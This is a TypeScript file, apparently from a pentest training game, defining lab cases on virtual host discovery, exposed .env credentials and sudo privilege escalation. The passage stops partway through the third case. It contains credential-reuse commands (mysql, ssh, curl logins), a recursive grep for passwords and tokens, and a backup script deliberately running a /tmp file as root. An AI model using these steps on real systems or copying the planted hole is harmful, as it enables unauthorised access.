/**
 * Casefile Library - Starter Cases
 * 
 * Three fully authored investigation scenarios:
 * 1. Host Header Discovery (HTTP fundamentals)
 * 2. The Forgotten Archive (backup disclosure)
 * 3. Sudo Misconfig Hunt (Linux privesc)
 */

import { Casefile, CasefileCategory, CasefileDifficulty } from '@/types/casefile';

// ============================================
// CASE 1: HOST HEADER DISCOVERY
// ============================================

export const caseHostHeader: Casefile = {
  id: 'case_web_vhost_001',
  title: 'The Invisible Admin Portal',
  
  difficulty: 'easy',
  estimatedMinutes: 20,
  category: 'web',
  subcategories: ['enumeration', 'http-fundamentals', 'vhosts'],
  primaryMechanic: 'Virtual host discovery',
  secondaryMechanic: 'Host header manipulation',
  methodologyStages: ['enumeration', 'analysis', 'exploitation', 'reporting'],
  
  brief: `A client claims their corporate portal is secure because "the admin panel isn't linked anywhere on the public site."

You have reconnaissance outputs from a web application assessment. The target responds on port 80, but directory fuzzing returned limited results.

Investigate whether the server hosts additional interfaces or administrative endpoints.`,
  
  learningObjectives: [
    'Understand HTTP Host header and virtual host concepts',
    'Recognize when directory fuzzing results are suspiciously minimal',
    'Practice Host header manipulation for vhost discovery',
    'Distinguish between "not linked" and "not accessible"',
    'Write a clear finding about exposed administrative surfaces'
  ],
  
  fundamentalsCovered: [
    'HTTP request structure',
    'Host header purpose',
    'Virtual hosts on shared IPs',
    'curl syntax for custom headers'
  ],
  
  reportSkillFocus: 'Administrative surface exposure vs. authentication strength',
  
  artifacts: [
    {
      path: '/evidence/nmap.txt',
      type: 'text',
      content: `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 172.16.18.142
Host is up (0.00032s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`
    },
    {
      path: '/evidence/gobuster.txt',
      type: 'text',
      content: `===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.18.142
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:            200,204,301,302,307,401,403
===============================================================

/assets               (Status: 301) [Size: 178] [--> http://172.16.18.142/assets/]
/css                  (Status: 301) [Size: 178] [--> http://172.16.18.142/css/]
/index.html           (Status: 200) [Size: 2341]
/js                   (Status: 301) [Size: 178] [--> http://172.16.18.142/js/]

===============================================================
Finished
===============================================================`
    },
    {
      path: '/evidence/homepage.txt',
      type: 'text',
      content: `HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 06 Jan 2025 14:23:11 GMT
Content-Type: text/html
Content-Length: 2341
Last-Modified: Wed, 18 Dec 2024 09:15:42 GMT
Connection: keep-alive
ETag: "6762a87e-925"
Accept-Ranges: bytes

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Corporate Portal</title>
</head>
<body>
    <h1>Welcome to InternalCorp Portal</h1>
    <p>Public information and resources.</p>
    <p>For administrative access, contact IT support.</p>
</body>
</html>`
    },
    {
      path: '/evidence/notes.txt',
      type: 'text',
      content: `Assessment Notes:
- Target: 172.16.18.142
- Web server: nginx 1.18.0
- Directory fuzzing: minimal results (only static assets)
- Client claims: "admin panel not publicly linked"
- Common vhost patterns to test:
  * admin.target.local
  * dev.target.local
  * internal.target.local
  * portal-admin.target.local`
    }
  ],
  
  supportedCommands: [
    'cat',
    'grep',
    'curl',
    'curl -H',
    'curl -I'
  ],
  
  commandResponses: [
    {
      match: /cat\s+\/evidence\/nmap\.txt/i,
      output: `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 172.16.18.142
Host is up (0.00032s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`
    },
    {
      match: /cat\s+\/evidence\/gobuster\.txt/i,
      output: `===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.18.142
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:            200,204,301,302,307,401,403
===============================================================

/assets               (Status: 301) [Size: 178] [--> http://172.16.18.142/assets/]
/css                  (Status: 301) [Size: 178] [--> http://172.16.18.142/css/]
/index.html           (Status: 200) [Size: 2341]
/js                   (Status: 301) [Size: 178] [--> http://172.16.18.142/js/]

===============================================================
Finished
===============================================================`,
      stateChange: ['reviewed_fuzzing_results']
    },
    {
      match: /cat\s+\/evidence\/homepage\.txt/i,
      output: `HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 06 Jan 2025 14:23:11 GMT
Content-Type: text/html
Content-Length: 2341
Last-Modified: Wed, 18 Dec 2024 09:15:42 GMT
Connection: keep-alive
ETag: "6762a87e-925"
Accept-Ranges: bytes

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Corporate Portal</title>
</head>
<body>
    <h1>Welcome to InternalCorp Portal</h1>
    <p>Public information and resources.</p>
    <p>For administrative access, contact IT support.</p>
</body>
</html>`,
      stateChange: ['reviewed_homepage']
    },
    {
      match: /cat\s+\/evidence\/notes\.txt/i,
      output: `Assessment Notes:
- Target: 172.16.18.142
- Web server: nginx 1.18.0
- Directory fuzzing: minimal results (only static assets)
- Client claims: "admin panel not publicly linked"
- Common vhost patterns to test:
  * admin.target.local
  * dev.target.local
  * internal.target.local
  * portal-admin.target.local`,
      stateChange: ['reviewed_notes']
    },
    {
      match: /curl\s+-[IH]\s+.*admin\..*\s+http:\/\/172\.16\.18\.142/i,
      output: `HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 06 Jan 2025 14:35:22 GMT
Content-Type: text/html
Content-Length: 4821
Last-Modified: Wed, 18 Dec 2024 11:42:15 GMT
Connection: keep-alive
ETag: "6762c8a7-12d5"
Accept-Ranges: bytes

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Portal - InternalCorp</title>
</head>
<body>
    <h1>Administrative Dashboard</h1>
    <form action="/login" method="POST">
        <label>Username:</label>
        <input type="text" name="username">
        <label>Password:</label>
        <input type="password" name="password">
        <button type="submit">Login</button>
    </form>
    <p>Default credentials: admin / Welcome2024!</p>
</body>
</html>`,
      stateChange: ['discovered_admin_vhost', 'found_default_creds'],
      triggersTheory: 'vhost_basics'
    },
    {
      match: /curl\s+.*http:\/\/admin\./i,
      output: `curl: (6) Could not resolve host: admin.target.local`
    }
  ],
  
  clues: [
    'Suspiciously minimal gobuster results (only static assets)',
    'Homepage mentions "administrative access" but no links',
    'Notes suggest testing vhost patterns',
    'nginx commonly hosts multiple virtual hosts on same IP',
    'curl with Host header reveals hidden admin interface'
  ],
  
  expectedFlow: [
    'Read nmap output - identify web server',
    'Review gobuster results - notice minimal findings',
    'Read homepage source - see admin reference',
    'Read notes - see vhost testing suggestions',
    'Test Host header with common admin patterns',
    'Discover admin vhost with default credentials exposed',
    'Document finding with security impact'
  ],
  
  commonMistakes: [
    'Accepting gobuster results as complete without questioning',
    'Trying DNS resolution instead of Host header manipulation',
    'Assuming "not linked" means "not accessible"',
    'Missing the vhost testing suggestion in notes',
    'Not recognizing minimal fuzzing results as suspicious'
  ],
  
  hints: [
    {
      tier: 1,
      text: 'The fuzzing results seem unusually sparse for a corporate portal. There might be more to discover that directory enumeration alone cannot find.',
      pointsCost: 2
    },
    {
      tier: 2,
      text: 'nginx often hosts multiple virtual hosts on the same IP. The Host header in HTTP requests determines which site the server returns. Try testing common administrative hostname patterns.',
      pointsCost: 5
    },
    {
      tier: 3,
      text: 'Use: curl -H "Host: admin.target.local" http://172.16.18.142/ to test if an administrative virtual host exists.',
      pointsCost: 10
    }
  ],
  
  theoryCards: [
    {
      id: 'vhost_basics',
      title: 'Virtual Hosts and Host Header Discovery',
      trigger: 'discovered_admin_vhost',
      whatThisIs: 'Virtual hosts (vhosts) allow a single web server to host multiple websites on one IP address. The server routes requests based on the Host header in the HTTP request.',
      whyItMatters: 'Administrative panels, development sites, and internal portals are often hidden behind alternate hostnames on the same IP. They rely on obscurity ("not linked") rather than proper access controls. Attackers can discover these by testing common hostname patterns.',
      pentestReflex: 'When directory fuzzing returns minimal results on a corporate web server, always test for virtual hosts. Common patterns: admin.*, dev.*, internal.*, portal-admin.*, test.*, staging.*',
      commonMisunderstanding: 'Many operators assume DNS resolution is required. In reality, you can directly manipulate the Host header with curl, Burp Suite, or browser extensions without DNS.',
      syntaxExample: `# Test vhost with curl
curl -H "Host: admin.target.local" http://172.16.18.142/

# Or with verbose headers
curl -I -H "Host: dev.target.local" http://172.16.18.142/`
    }
  ],
  
  successConditions: [
    'reviewed_fuzzing_results',
    'discovered_admin_vhost',
    'found_default_creds'
  ],
  
  expectedFinding: {
    title: 'Exposed Administrative Portal via Virtual Host Discovery',
    severity: 'high',
    cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (8.2)',
    description: 'The web server at 172.16.18.142 hosts an administrative dashboard accessible via the "admin.target.local" virtual host. This interface is not linked from the public site but is fully accessible when the correct Host header is supplied. The login page exposes default credentials in HTML comments.',
    impact: 'An unauthenticated attacker can discover the administrative interface through vhost enumeration and gain full administrative access using default credentials. This could lead to complete compromise of the web application, data exfiltration, and potential lateral movement within the internal network.',
    evidence: [
      'curl -H "Host: admin.target.local" http://172.16.18.142/ returns administrative dashboard',
      'Default credentials visible in page source: admin / Welcome2024!',
      'Administrative functions exposed without network-level access controls'
    ],
    reproductionSteps: [
      'Run: curl -I http://172.16.18.142/ (observe minimal public content)',
      'Run: curl -H "Host: admin.target.local" http://172.16.18.142/',
      'Observe administrative login page with exposed default credentials',
      'Test credentials for access to administrative functions'
    ],
    remediation: 'Implement proper access controls: (1) Restrict admin interface to internal networks via firewall rules or nginx configuration, (2) Remove or change all default credentials, (3) Implement strong authentication (MFA recommended), (4) Add rate limiting and account lockout policies, (5) Remove credential disclosure from HTML source.'
  },
  
  reflectionPrompts: [
    {
      question: 'What made the gobuster results suspicious enough to warrant additional enumeration techniques?',
      purpose: 'Tests signal recognition and enumeration intuition'
    },
    {
      question: 'What did you initially assume about the phrase "not publicly linked"? How did that assumption change?',
      purpose: 'Calibrates understanding of security by obscurity'
    },
    {
      question: 'If you missed the vhost discovery initially, what would you do differently next time when fuzzing returns minimal results?',
      purpose: 'Builds methodology for future assessments'
    }
  ],
  
  scoringRubric: {
    completion: 30,
    methodology: 20,
    signalRecognition: 15,
    efficiency: 10,
    reporting: 20,
    reflection: 5,
    total: 100
  },
  
  variationIdeas: [
    'Change hostname patterns (dev.*, internal.*, staging.*)',
    'Vary web server (Apache, IIS instead of nginx)',
    'Alternate credential disclosure method (robots.txt, comments, JavaScript)'
  ],
  
  implementationNotes: {
    artifactTriggers: {
      'reviewed_fuzzing_results': 'User should notice minimal results',
      'discovered_admin_vhost': 'Successful Host header manipulation',
      'found_default_creds': 'Observed credentials in output'
    },
    stateFlags: [
      'reviewed_nmap',
      'reviewed_fuzzing_results',
      'reviewed_homepage',
      'reviewed_notes',
      'discovered_admin_vhost',
      'found_default_creds'
    ],
    uiHints: [
      'Highlight "only static assets" in gobuster output',
      'Emphasize vhost testing notes',
      'Show theory card after successful vhost discovery'
    ]
  }
};

// ============================================
// CASE 2: THE FORGOTTEN ARCHIVE
// ============================================

export const caseForgottenArchive: Casefile = {
  id: 'case_web_backup_001',
  title: 'The Forgotten Archive',
  
  difficulty: 'easy',
  estimatedMinutes: 25,
  category: 'web',
  subcategories: ['enumeration', 'source-disclosure', 'credential-exposure'],
  primaryMechanic: 'Exposed backup disclosure',
  secondaryMechanic: 'Credential reuse',
  methodologyStages: ['enumeration', 'analysis', 'exploitation', 'reporting'],
  
  brief: `A client believes a development web directory "contains no meaningful risk" because it is not linked from the main site.

You have reconnaissance outputs and several recovered artifacts from a web application assessment.

Assess whether the exposed development material could lead to compromise.`,
  
  learningObjectives: [
    'Recognize sensitive development artifacts in web-accessible directories',
    'Understand the significance of .env files and configuration material',
    'Pivot from information disclosure to realistic attack path reasoning',
    'Practice credential hunting in exposed source code and configs',
    'Write a clear pentest finding distinguishing disclosure from exploitation'
  ],
  
  fundamentalsCovered: [
    'Environment files (.env)',
    'Development artifacts and backups',
    'Credential storage antipatterns',
    'grep for secrets'
  ],
  
  reportSkillFocus: 'Impact articulation - disclosure vs. exploitation vs. lateral movement potential',
  
  artifacts: [
    {
      path: '/evidence/nmap.txt',
      type: 'text',
      content: `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.87.201
Host is up (0.00028s latency).
Not shown: 997 closed tcp ports (reset)

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.7.33-0ubuntu0.20.04.1

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`
    },
    {
      path: '/evidence/gobuster.txt',
      type: 'text',
      content: `===============================================================
Gobuster v3.6
===============================================================
[+] Url:                     http://10.129.87.201
[+] Method:                  GET
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================

/assets               (Status: 301)
/dev                  (Status: 301) [Size: 312] [--> http://10.129.87.201/dev/]
/index.php            (Status: 200) [Size: 3421]
/uploads              (Status: 301)

===============================================================
Finished
===============================================================`
    },
    {
      path: '/dev/.env.old',
      type: 'text',
      content: `# Development Environment Configuration
# DEPRECATED - migrated to docker secrets 2024-11-20
# TODO: remove this file before deployment

APP_NAME=PortalDev
APP_ENV=development
APP_DEBUG=true
APP_URL=http://dev.internal-corp.local

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=portal_dev
DB_USERNAME=portal_user
DB_PASSWORD=DevPortal2024!Summer

MAIL_MAILER=smtp
MAIL_HOST=smtp.internal-corp.local
MAIL_PORT=587
MAIL_USERNAME=noreply@internal-corp.local
MAIL_PASSWORD=M4ilS3rv3r!2024

SESSION_DRIVER=file
SESSION_LIFETIME=120`
    },
    {
      path: '/dev/users.sql',
      type: 'text',
      content: `-- Database dump for portal_dev.users
-- Generated: 2024-11-15 14:23:11

USE portal_dev;

CREATE TABLE IF NOT EXISTS users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50) NOT NULL UNIQUE,
  email VARCHAR(100) NOT NULL UNIQUE,
  password_hash VARCHAR(255) NOT NULL,
  role ENUM('user', 'admin', 'developer') DEFAULT 'user',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

INSERT INTO users (username, email, password_hash, role) VALUES
('admin', 'admin@internal-corp.local', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'admin'),
('developer1', 'dev1@internal-corp.local', '$2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm', 'developer'),
('test_user', 'test@internal-corp.local', '$2y$10$RAv7bDBUKa5C9FmfuX3r3O.7RO8WpNM/ZBCZs5.KnLqN/hzf5Eo2i', 'user');

-- Note: password hashes are bcrypt
-- admin password: AdminPortal123!
-- developer1 password: DevPass2024!
-- test_user password: TestUser123!`
    },
    {
      path: '/evidence/notes.txt',
      type: 'text',
      content: `Assessment Notes:
- Target: 10.129.87.201
- Web stack: Apache + PHP + MySQL
- Development directory found: /dev/
- Directory listing may be enabled
- Check for exposed configs, backups, or source code
- MySQL port 3306 open - test discovered credentials
- Possible credential reuse on SSH (port 22)`
    }
  ],
  
  supportedCommands: [
    'cat',
    'grep',
    'find',
    'mysql',
    'ssh'
  ],
  
  commandResponses: [
    {
      match: /cat\s+\/dev\/\.env\.old/i,
      output: `# Development Environment Configuration
# DEPRECATED - migrated to docker secrets 2024-11-20
# TODO: remove this file before deployment

APP_NAME=PortalDev
APP_ENV=development
APP_DEBUG=true
APP_URL=http://dev.internal-corp.local

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=portal_dev
DB_USERNAME=portal_user
DB_PASSWORD=DevPortal2024!Summer

MAIL_MAILER=smtp
MAIL_HOST=smtp.internal-corp.local
MAIL_PORT=587
MAIL_USERNAME=noreply@internal-corp.local
MAIL_PASSWORD=M4ilS3rv3r!2024

SESSION_DRIVER=file
SESSION_LIFETIME=120`,
      stateChange: ['found_env_file', 'found_db_creds'],
      triggersTheory: 'env_file_exposure'
    },
    {
      match: /cat\s+\/dev\/users\.sql/i,
      output: `-- Database dump for portal_dev.users
-- Generated: 2024-11-15 14:23:11

USE portal_dev;

CREATE TABLE IF NOT EXISTS users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50) NOT NULL UNIQUE,
  email VARCHAR(100) NOT NULL UNIQUE,
  password_hash VARCHAR(255) NOT NULL,
  role ENUM('user', 'admin', 'developer') DEFAULT 'user',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

INSERT INTO users (username, email, password_hash, role) VALUES
('admin', 'admin@internal-corp.local', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'admin'),
('developer1', 'dev1@internal-corp.local', '$2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm', 'developer'),
('test_user', 'test@internal-corp.local', '$2y$10$RAv7bDBUKa5C9FmfuX3r3O.7RO8WpNM/ZBCZs5.KnLqN/hzf5Eo2i', 'user');

-- Note: password hashes are bcrypt
-- admin password: AdminPortal123!
-- developer1 password: DevPass2024!
-- test_user password: TestUser123!`,
      stateChange: ['found_user_dump', 'found_plaintext_passwords']
    },
    {
      match: /grep.*pass.*\.env/i,
      output: `DB_PASSWORD=DevPortal2024!Summer
MAIL_PASSWORD=M4ilS3rv3r!2024`,
      stateChange: ['found_db_creds']
    },
    {
      match: /mysql.*portal_user/i,
      output: `mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \\g.
Your MySQL connection id is 42
Server version: 5.7.33-0ubuntu0.20.04.1 (Ubuntu)

Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| portal_dev         |
| portal_prod        |
+--------------------+
3 rows in set (0.00 sec)`,
      stateChange: ['mysql_access_confirmed'],
      triggersTheory: 'credential_reuse'
    }
  ],
  
  clues: [
    'Development directory /dev/ exposed via gobuster',
    'Old .env file with database credentials',
    'MySQL port 3306 accessible',
    'SQL dump with password hints in comments',
    'SSH port 22 open for credential testing'
  ],
  
  expectedFlow: [
    'Review gobuster - identify /dev/ directory',
    'Enumerate /dev/ contents',
    'Find .env.old file with database credentials',
    'Find users.sql dump with additional context',
    'Test database credentials on MySQL (port 3306)',
    'Document credential exposure and realistic attack path'
  ],
  
  commonMistakes: [
    'Dismissing .env file as "just config" without checking for secrets',
    'Not testing discovered credentials on available services',
    'Missing the credential reuse potential on SSH',
    'Focusing only on bcrypt hashes instead of plaintext DB creds',
    'Weak impact statement: "information disclosure" without explaining pivot potential'
  ],
  
  hints: [
    {
      tier: 1,
      text: 'Development directories often contain material not meant for production. Focus on files that developers use for configuration and testing.',
      pointsCost: 2
    },
    {
      tier: 2,
      text: 'Configuration files frequently store credentials in key=value format. Look for environment files or config backups.',
      pointsCost: 5
    },
    {
      tier: 3,
      text: 'Check /dev/.env.old - it contains database credentials. Test them against the exposed MySQL service on port 3306.',
      pointsCost: 10
    }
  ],
  
  theoryCards: [
    {
      id: 'env_file_exposure',
      title: 'Environment Files and Secret Disclosure',
      trigger: 'found_env_file',
      whatThisIs: 'Environment files (.env, .env.old, .env.backup) store application configuration including database credentials, API keys, and service passwords. They are meant for local development and should never be committed to repositories or deployed to production.',
      whyItMatters: 'Developers frequently leave old versions, backups, or test copies in web-accessible directories. Exposure leads to direct database access, credential reuse attacks, lateral movement to internal services, and potential full application compromise.',
      pentestReflex: 'Always check for .env, .env.old, .env.backup, .env.dev, .env.prod in discovered directories. Also look for: config.php, database.yml, wp-config.php, application.properties, settings.py.',
      commonMisunderstanding: 'Many operators treat credential disclosure as low-severity "information leak." In reality, database credentials often enable full data exfiltration, authentication bypass, and lateral movement - this is frequently a direct path to critical impact.',
      syntaxExample: `# Find environment files
find . -name ".env*" -o -name "*.env"

# Search for password strings
grep -RniE "pass|password|secret|key|token" .

# Test MySQL access
mysql -h 10.129.87.201 -u portal_user -p'DevPortal2024!Summer'`
    },
    {
      id: 'credential_reuse',
      title: 'Credential Reuse and Lateral Movement',
      trigger: 'mysql_access_confirmed',
      whatThisIs: 'Credential reuse is the practice of using the same or similar passwords across multiple systems and services. In compromised environments, credentials found in one location often work on other services.',
      whyItMatters: 'Database credentials discovered in config files frequently work on SSH, admin panels, internal services, or other databases. This enables lateral movement beyond the initial disclosure point.',
      pentestReflex: 'Always test discovered credentials on ALL available services: SSH (22), MySQL (3306), PostgreSQL (5432), RDP (3389), SMB (445), web admin panels, API endpoints. Document each successful authentication separately.',
      commonMisunderstanding: 'Operators often stop after confirming database access. In pentests, credential reuse is a primary lateral movement vector - test everywhere.',
      syntaxExample: `# Test on MySQL
mysql -h 10.129.87.201 -u portal_user -p'DevPortal2024!Summer'

# Test on SSH
ssh portal_user@10.129.87.201

# Test credentials on web admin panel
curl -X POST http://10.129.87.201/admin/login \\
  -d "username=portal_user&password=DevPortal2024!Summer"`
    }
  ],
  
  successConditions: [
    'found_env_file',
    'found_db_creds',
    'mysql_access_confirmed'
  ],
  
  expectedFinding: {
    title: 'Exposed Development Backup and Environment File Disclosure',
    severity: 'high',
    cvss: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (8.2)',
    description: 'A development backup directory (/dev/) is accessible over HTTP at http://10.129.87.201/dev/. Inside this directory, a stale environment file (.env.old) exposes database credentials and mail server credentials. Additionally, a SQL dump (users.sql) contains user account information and password hints.',
    impact: 'An unauthenticated attacker can recover sensitive credentials from the exposed development directory. The database credentials (portal_user / DevPortal2024!Summer) provide direct access to the MySQL database on port 3306, enabling complete data exfiltration. Credentials may also be reused on SSH (port 22) or other internal services, facilitating lateral movement and potential full system compromise.',
    evidence: [
      'Development directory accessible: http://10.129.87.201/dev/',
      'Environment file: /dev/.env.old containing DB_PASSWORD=DevPortal2024!Summer',
      'SQL dump: /dev/users.sql with password hints in comments',
      'Successful MySQL access confirmed: mysql -h 10.129.87.201 -u portal_user -p',
      'Database enumeration reveals both portal_dev and portal_prod databases accessible'
    ],
    reproductionSteps: [
      'Browse to http://10.129.87.201/dev/',
      'Download .env.old file',
      'Extract database credentials: portal_user / DevPortal2024!Summer',
      'Test credentials: mysql -h 10.129.87.201 -u portal_user -p\'DevPortal2024!Summer\'',
      'Execute: show databases; (observe access to portal_dev and portal_prod)',
      'Execute: use portal_prod; show tables; (confirm production data access)'
    ],
    remediation: 'Immediately remove all development artifacts from the production webroot. Specifically: (1) Delete /dev/ directory and all contents, (2) Rotate all exposed credentials (database, mail server), (3) Audit for other backup files (.bak, .old, .backup, .git), (4) Implement web server rules to block directory listing, (5) Review deployment procedures to prevent future development file exposure, (6) Restrict MySQL access to localhost or internal networks only.'
  },
  
  reflectionPrompts: [
    {
      question: 'What clue should have redirected your attention to the /dev/ directory earliest in the investigation?',
      purpose: 'Tests prioritization of enumeration results'
    },
    {
      question: 'What did you initially assume about .env files? How does this case change your reflex when encountering config material?',
      purpose: 'Calibrates understanding of configuration file criticality'
    },
    {
      question: 'How would you phrase the difference between "information disclosure" and "credential exposure leading to database compromise" in a client report?',
      purpose: 'Trains impact articulation and severity justification'
    }
  ],
  
  scoringRubric: {
    completion: 30,
    methodology: 20,
    signalRecognition: 15,
    efficiency: 10,
    reporting: 20,
    reflection: 5,
    total: 100
  },
  
  variationIdeas: [
    'Change file types (wp-config.php.bak, database.yml.old, application.properties.backup)',
    'Vary directory names (/backup/, /.git/, /old/, /test/)',
    'Different credentials (MongoDB, PostgreSQL, Redis, SSH keys)'
  ]
};

// ============================================
// CASE 3: SUDO MISCONFIG HUNT
// ============================================

export const caseSudoMisconfig: Casefile = {
  id: 'case_linux_sudo_001',
  title: 'The Helpful Script',
  
  difficulty: 'medium',
  estimatedMinutes: 30,
  category: 'linux',
  subcategories: ['privilege-escalation', 'sudo-abuse', 'enumeration'],
  primaryMechanic: 'sudo misconfiguration',
  secondaryMechanic: 'writable script exploitation',
  methodologyStages: ['enumeration', 'analysis', 'exploitation', 'reporting'],
  
  brief: `You have gained initial access to a Linux system as user 'webdev' through SSH key reuse.

Local enumeration outputs and system artifacts are available. The system appears to be a corporate web server with custom automation scripts.

Identify a privilege escalation path to root and document the security issue.`,
  
  learningObjectives: [
    'Recognize sudo misconfiguration patterns',
    'Understand the difference between (ALL) and (root) in sudo rules',
    'Identify exploitable sudo permissions on scripts',
    'Practice privilege escalation methodology (sudo → SUID → kernel → cron)',
    'Write a clear privesc finding with proof of concept'
  ],
  
  fundamentalsCovered: [
    'sudo -l interpretation',
    'sudo NOPASSWD rules',
    'PATH manipulation',
    'script analysis for privilege escalation'
  ],
  
  reportSkillFocus: 'Privilege escalation impact vs. initial foothold impact',
  
  artifacts: [
    {
      path: '/evidence/id_output.txt',
      type: 'text',
      content: `uid=1001(webdev) gid=1001(webdev) groups=1001(webdev),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)`
    },
    {
      path: '/evidence/sudo_-l.txt',
      type: 'text',
      content: `Matching Defaults entries for webdev on web-server-01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User webdev may run the following commands on web-server-01:
    (ALL : ALL) NOPASSWD: /usr/local/bin/backup-site.sh`
    },
    {
      path: '/usr/local/bin/backup-site.sh',
      type: 'code',
      content: `#!/bin/bash
# Corporate website backup automation
# Runs nightly via cron, also available for manual execution
# Author: IT Team
# Last modified: 2024-10-12

BACKUP_DIR="/var/backups/website"
WEB_ROOT="/var/www/html"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BACKUP_FILE="$BACKUP_DIR/backup_$TIMESTAMP.tar.gz"

# Ensure backup directory exists
mkdir -p "$BACKUP_DIR"

# Compress website files
echo "[*] Starting backup of $WEB_ROOT"
tar -czf "$BACKUP_FILE" "$WEB_ROOT"

# Set permissions
chmod 644 "$BACKUP_FILE"

# Cleanup old backups (keep last 7 days)
find "$BACKUP_DIR" -name "backup_*.tar.gz" -mtime +7 -delete

echo "[+] Backup completed: $BACKUP_FILE"
echo "[*] Running post-backup verification script..."

# Run verification if available
if [ -f "/tmp/verify-backup.sh" ]; then
    bash /tmp/verify-backup.sh
fi`
    },
    {
      path: '/evidence/ls_-la_tmp.txt',
      type: 'text',
      content: `total 28
drwxrwxrwt  7 root   root    4096 Jan  6 14:45 .
drwxr-xr-x 19 root   root    4096 Dec 18 09:23 ..
drwxrwxrwt  2 root   root    4096 Jan  6 08:15 .ICE-unix
drwxrwxrwt  2 root   root    4096 Jan  6 08:15 .Test-unix
drwxrwxrwt  2 root   root    4096 Jan  6 08:15 .X11-unix
drwxrwxrwt  2 root   root    4096 Jan  6 08:15 .XIM-unix
drwxrwxrwt  2 root   root    4096 Jan  6 08:15 .font-unix
-rw-r--r--  1 root   root       0 Jan  6 08:15 .X0-lock`
    },
    {
      path: '/evidence/notes.txt',
      type: 'text',
      content: `Enumeration Checklist:
✓ sudo -l (found: NOPASSWD on backup-site.sh)
✓ SUID binaries (nothing unusual)
✓ Writable files in /etc (none found)
✓ Cron jobs (standard only)
- Check backup-site.sh for vulnerabilities
- Look for writable paths or command injection
- Test if script sources external files
- Verify script execution with elevated privileges`
    }
  ],
  
  supportedCommands: [
    'cat',
    'ls',
    'echo',
    'bash',
    'sudo'
  ],
  
  commandResponses: [
    {
      match: /cat\s+\/evidence\/sudo_-l\.txt/i,
      output: `Matching Defaults entries for webdev on web-server-01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User webdev may run the following commands on web-server-01:
    (ALL : ALL) NOPASSWD: /usr/local/bin/backup-site.sh`,
      stateChange: ['reviewed_sudo_perms']
    },
    {
      match: /cat\s+\/usr\/local\/bin\/backup-site\.sh/i,
      output: `#!/bin/bash
# Corporate website backup automation
# Runs nightly via cron, also available for manual execution
# Author: IT Team
# Last modified: 2024-10-12

BACKUP_DIR="/var/backups/website"
WEB_ROOT="/var/www/html"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BACKUP_FILE="$BACKUP_DIR/backup_$TIMESTAMP.tar.gz"

# Ensure backup directory exists
mkdir -p "$BACKUP_DIR"

# Compress website files
echo "[*] Starting backup of $WEB_ROOT"
tar -czf "$BACKUP_FILE" "$WEB_ROOT"

# Set permissions
chmod 644 "$BACKUP_FILE"

# Cleanup old backups (keep last 7 days)
find "$BACKUP_DIR" -name "backup_*.tar.gz" -mtime +7 -delete

